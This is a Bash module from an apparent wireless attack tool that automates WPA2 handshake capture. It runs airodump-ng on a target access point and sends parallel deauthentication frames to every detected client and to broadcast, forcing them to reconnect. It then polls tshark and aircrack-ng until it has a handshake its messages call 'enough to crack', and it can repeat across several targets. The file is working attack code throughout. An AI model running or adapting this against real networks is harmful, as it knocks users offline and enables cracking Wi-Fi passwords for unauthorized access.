#!/usr/bin/env bash
# lib/capture.sh -- WPA2 handshake capture.
# Not executed directly. Loaded by the entrypoint.
#
# FLUJO POR INTENTO:
#   1. (First attempt only) Scan clients on the AP
#   2. Iniciar airodump-ng en background              ← PRIMERO, siempre
#   3. Esperar 2s a que airodump abra el pcap
#   4. Deauth to ALL clients in parallel + broadcast  <- AFTER
#   5. Monitorear sin tiempo predefinido:
#        · Cada 1s: tshark (rápido) si disponible — detección temprana
#        · Cada 3s: aircrack-ng (definitivo) — confirmación
#        · Salida INMEDIATA al detectar handshake
#        · CAP_MAX_SEC solo como límite de seguridad antibloqueo
#   6. Handshake → matar procesos, salir con éxito
#   7. Sin handshake → siguiente intento
#
# MULTI-TARGET: capture() returns 1 instead of die() so the loop in
# the entrypoint can continue with the next target.

# _hs_tshark: verificación rápida y barata con tshark.
# Retorna 0 si hay ≥2 frames EAPOL en el .cap.
_hs_tshark() {
    [[ -z "$HAS_TSHARK" || ! -f "$1" ]] && return 1
    local n
    n=$(tshark -r "$1" -Y "eapol" -T fields -e frame.number 2>/dev/null | wc -l) || return 1
    ((n >= 2))
}

# _hs_aircrack: verificación definitiva con aircrack-ng.
# Retorna 0 si hay handshake completo.
_hs_aircrack() {
    [[ ! -f "$1" ]] && return 1
    aircrack-ng "$1" 2>/dev/null | grep -qE '[1-9][0-9]* handshake'
}

# _check_handshake: verificación completa con logging de resultados.
# Retorna 0 si hay handshake útil (completo o parcial suficiente).
_check_handshake() {
    local cap_file="$1"
    [[ ! -f "$cap_file" ]] && return 1

    # aircrack-ng — fuente de verdad para handshake completo
    local aircrack_out hs_count=0
    aircrack_out=$(aircrack-ng "$cap_file" 2>/dev/null || true)
    local frame_info
    frame_info=$(echo "$aircrack_out" | grep -oE '[0-9]+ handshake' | head -1) || true
    [[ -n "$frame_info" ]] &&
        hs_count=$(echo "$frame_info" | grep -oE '^[0-9]+') ||
        hs_count=0

    # tshark — frames EAPOL (handshake parcial también es crackeable)
    local eapol_count=0
    [[ -n "$HAS_TSHARK" ]] &&
        eapol_count=$(tshark -r "$cap_file" -Y "eapol" -T fields \
            -e frame.number 2>/dev/null | wc -l) || true

    if ((hs_count > 0)); then
        ok "Handshake captured! (aircrack: ${hs_count} | EAPOL: ${eapol_count} frames)"
        return 0
    fi
    if ((eapol_count >= 2)); then
        ok "Partial handshake valid! (${eapol_count} EAPOL frames -- enough to crack)"
        return 0
    fi

    return 1
}

# _monitor_capture: bucle de monitoreo event-driven, sin tiempo predefinido.
# Sale tan pronto como detecta handshake. CAP_MAX_SEC es solo límite de seguridad.
# Retorna 0 si detectó handshake, 1 si se agotó CAP_MAX_SEC.
_monitor_capture() {
    local adump="$1" deauth_pid="$2" cap_file="$3" clients="$4"
    local elapsed=0

    while true; do

        # Guardia: airodump muerto inesperadamente
        if ! kill -0 "$adump" 2>/dev/null; then
            echo "" >&2
            warn "airodump-ng terminated unexpectedly."
            return 1
        fi

        printf "\r  ${C}[%3ds] dump=%-6s deauth=%-6s clients=%-2s${N}" \
            "$elapsed" "$adump" "$deauth_pid" "$clients" >&2

        # Cada segundo: tshark (barato) → si positivo, confirmar con aircrack
        if _hs_tshark "$cap_file" 2>/dev/null; then
            if _hs_aircrack "$cap_file" 2>/dev/null; then
                echo "" >&2
                _check_handshake "$cap_file" # log con conteos detallados
                return 0
            fi
        fi

        # Cada 3s: aircrack directo (aunque tshark no haya visto nada aún)
        if ((elapsed > 0 && elapsed % 3 == 0)); then
            if _check_handshake "$cap_file" 2>/dev/null; then
                echo "" >&2
                return 0
            fi
        fi

        # Límite de seguridad: nunca bloquear indefinidamente
        if ((elapsed >= CAP_MAX_SEC)); then
            echo "" >&2
            warn "Safety limit reached (${CAP_MAX_SEC}s) with no handshake in this attempt."
            return 1
        fi

        sleep 1
        elapsed=$((elapsed + 1))
    done
}

# capture_once: ciclo completo de intentos. Retorna 0 si capturó handshake.
capture_once() {
    if [[ "$WAI_DRY_RUN" == "1" ]]; then
        dbg "[dry-run] capture_once: airodump-ng + deauth on $MON"
        CAP_FILE="${TMP}/cap_dryrun.cap"
        return 0
    fi
    local base="${TMP}/cap_${TARGET//:/_}"

    # -- Client scan (once -- reused across all attempts) --
    hdr "Detecting clients on '${SSID_NAME}'"
    local clients_count
    clients_count=$(detect_clients)
    if [[ ! "$clients_count" =~ ^[0-9]+$ ]]; then
        clients_count=0
    fi

    if ((clients_count > 0)); then
        ok "${clients_count} client(s) detected -- parallel deauth to all + broadcast."
    else
        warn "0 clients detected -- broadcast deauth only."
        warn "  Without clients the handshake is very hard. Verify devices are connected."
    fi

    info "Planned attempts: ${MAX_TRIES_DEFAULT}"

    # ── Loop de intentos ────────────────────────────────────────────────────────
    local attempt=1
    while ((attempt <= MAX_TRIES_DEFAULT)); do
        hdr "Attempt ${attempt}/${MAX_TRIES_DEFAULT} -- BSSID=${TARGET}  Channel=${CHANNEL}"

        rm -f "${base}"-*.cap 2>/dev/null || true
        local cap_log="${TMP}/cap_attempt${attempt}_${TARGET//:/_}.log"
        local deauth_log="${TMP}/deauth_attempt${attempt}_${TARGET//:/_}.log"

        # ── PASO 1: airodump-ng PRIMERO ──────────────────────────────────────
        info "Starting capture (airodump-ng, channel ${CHANNEL})..."
        airodump-ng \
            --bssid "$TARGET" \
            --channel "$CHANNEL" \
            --output-format pcap \
            --write "$base" \
            "$MON" >"$cap_log" 2>&1 &
        local adump=$!
        dbg "airodump-ng PID: ${adump}"

        # Esperar a que airodump abra el pcap y esté listo para capturar
        sleep 2
        if ! kill -0 "$adump" 2>/dev/null; then
            warn "airodump-ng died at start (attempt ${attempt}). Log:"
            while IFS= read -r l; do warn "  $l"; done <"$cap_log" || true
            attempt=$((attempt + 1))
            continue
        fi
        ok "airodump-ng active (PID ${adump})."

        # -- STEP 2: deauth to ALL clients in parallel + broadcast ------
        local deauth_pid
        deauth_pid=$(run_deauth "$deauth_log")
        dbg "Deauth PID: ${deauth_pid}"

        # ── PASO 3: monitorear — salida inmediata al detectar handshake ──────
        local cf="${base}-01.cap"
        if _monitor_capture "$adump" "$deauth_pid" "$cf" "$clients_count"; then
            kill "$deauth_pid" 2>/dev/null || true
            wait "$deauth_pid" 2>/dev/null || true
            kill "$adump" 2>/dev/null || true
            wait "$adump" 2>/dev/null || true
            CAP_FILE="$cf"
            return 0
        fi

        # Tiempo agotado — limpiar procesos
        kill "$deauth_pid" 2>/dev/null || true
        wait "$deauth_pid" 2>/dev/null || true
        kill "$adump" 2>/dev/null || true
        wait "$adump" 2>/dev/null || true
        sleep 1

        dbg "Deauth log attempt ${attempt}:"
        while IFS= read -r l; do dbg "  $l"; done <"$deauth_log" 2>/dev/null || true

        # Final .cap review even if the monitor loop missed it in real time
        if [[ -f "$cf" ]] && _check_handshake "$cf"; then
            CAP_FILE="$cf"
            return 0
        fi

        warn "No handshake on attempt ${attempt}/${MAX_TRIES_DEFAULT}."
        ((attempt < MAX_TRIES_DEFAULT)) && {
            info "Waiting 3s before next attempt..."
            sleep 3
        }
        attempt=$((attempt + 1))
    done

    return 1
}

# capture: orquesta capture_once con re-escaneo si la caché estaba expirada.
# En modo multi-target retorna 1 en lugar de die() para no abortar la sesión.
capture() {
    hdr "WPA2 handshake capture -- ${SSID_NAME:-$TARGET}"

    if capture_once; then
        write_meta
        return 0
    fi

    if ((META_LOADED == 2)); then
        warn "Stale cache failed -- rescanning to verify data..."
        local old_target="$TARGET" old_channel="$CHANNEL"
        META_LOADED=0
        rm -f "$META_FILE" 2>/dev/null || true

        run_scan
        local csv="${TMP}/scan-01.csv"
        local new_bssid new_channel row

        if [[ "$old_target" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            new_channel=$(awk -F',' -v b="${old_target^^}" '
                /^[0-9A-Fa-f]{2}:/ {
                    gsub(/ /,"",$1); gsub(/ /,"",$4)
                    if (toupper($1)==b) { print $4; exit }
                }' "$csv") || true
            new_bssid="$old_target"
        else
            row=$(awk -F',' -v s="$SSID_NAME" '
                /^[0-9A-Fa-f]{2}:/ {
                    for(i=1;i<=NF;i++) gsub(/^ +| +$/,"",$i)
                    if ($14==s && $6~/WPA/) { print $1"|"$4; exit }
                }' "$csv") || true
            new_bssid=$(cut -d'|' -f1 <<<"$row" 2>/dev/null) || true
            new_channel=$(cut -d'|' -f2 <<<"$row" 2>/dev/null) || true
        fi

        if [[ -z "$new_bssid" || -z "$new_channel" ]]; then
            warn "Rescan found nothing for '${SSID_NAME}'. Is the AP on and in range?"
            _record_target_failure
            return 1
        fi

        new_bssid="${new_bssid^^}"
        dbg "Comparando: old=${old_target}/${old_channel}  new=${new_bssid}/${new_channel}"

        if [[ "$new_bssid" != "$old_target" || "$new_channel" != "$old_channel" ]]; then
            warn "Data updated: BSSID ${old_target} -> ${new_bssid}  Channel ${old_channel} -> ${new_channel}"
            TARGET="$new_bssid"
            CHANNEL="$new_channel"
            write_meta
            if capture_once; then
                write_meta
                return 0
            fi
            warn "No handshake after retry with refreshed data -- moving to next target."
            _record_target_failure
            return 1
        else
            write_meta
            warn "No handshake. Data verified correct."
            warn "  Causes: no active clients, weak signal, PMF/MFP enabled on the AP."
            _record_target_failure
            return 1
        fi

    elif ((META_LOADED == 1)); then
        warn "No handshake. Fresh cache -- data correct."
        warn "  Causes: no active clients, weak signal, PMF enabled."
        _record_target_failure
        return 1
    else
        warn "Sin handshake."
        warn "  Causes: no active clients, weak signal, AP out of range."
        _record_target_failure
        return 1
    fi
}
